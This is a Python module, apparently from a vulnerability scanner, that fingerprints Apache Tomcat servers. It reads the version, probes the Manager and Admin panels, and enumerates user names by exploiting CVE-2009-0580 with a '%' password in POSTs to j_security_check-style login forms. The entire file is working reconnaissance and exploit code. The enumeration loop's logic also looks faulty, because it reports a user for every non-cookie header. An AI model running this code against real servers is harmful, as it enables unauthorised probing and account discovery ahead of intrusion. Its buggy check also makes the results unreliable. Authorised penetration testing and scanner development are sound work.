import proto.http
import re, string

def check_version(host, port):
  result = proto.http.send_get_request(host, port, '/index.jsp', None)[2]
  if not result:
    return []
  info = []
  tmps = re.findall('<title>.*?</title>', result, re.DOTALL)
  for tmp in tmps:
    tmp = tmp.replace('<title>', '')
    tmp = tmp.replace('</title>', '')
    info.append('Version: %s\n' % tmp)
  return info

def manager(host, port):
  url = '/manager/html'
  (status, headers, body) = proto.http.send_get_request(host, port, url, None)
  info = []
  if status == 401:
    info.append('Tomcat Manager Tool available (%s) with an authentication\n' % url)
  else:
    info.append('Tomcat Manager Tool available (%s) !\n' % url)
  return info

def _admin(host, port, url):
  (status, headers, body) = proto.http.send_get_request(host, port, url, None)
  info = []
  if status == 302:
    for header in headers:
      if string.lower(header[0]) == 'location':
        location = header[1]
        location = location.replace('http://%s:%s' % (host, port), '')
        return _admin(host, port, location)
  else:
    if 'j_username' in body and 'j_password' in body:
      info.append('Tomcat Admin Tool available (%s) with an authentication!\n' % url)
    else:
      info.append('Tomcat Admin Tool available (%s) !\n' % url)
  return info

def admin(host, port):
  return _admin(host, port, '/admin/index.jsp')

def enum_login(host, port, url, wordlist):
  if not wordlist:
    wordlist = ['tomcat', 'admin', 'role1', 'root', 'manager', 'both']
  info = []
  for user in wordlist:
    (status, headers, body) = proto.http.send_post_request(host, port, url, None, {'j_password':'%', 'j_username':user})
    if status == 200:
      for header in headers:
        if string.lower(header[0]) == 'set-cookie':
          continue
        else:
          info.append('CVE-2009-0580 - User found: %s\n' % user)
    else:
      info.append('CVE-2009-0580 - Not vulnerable\n')
      break
  return info
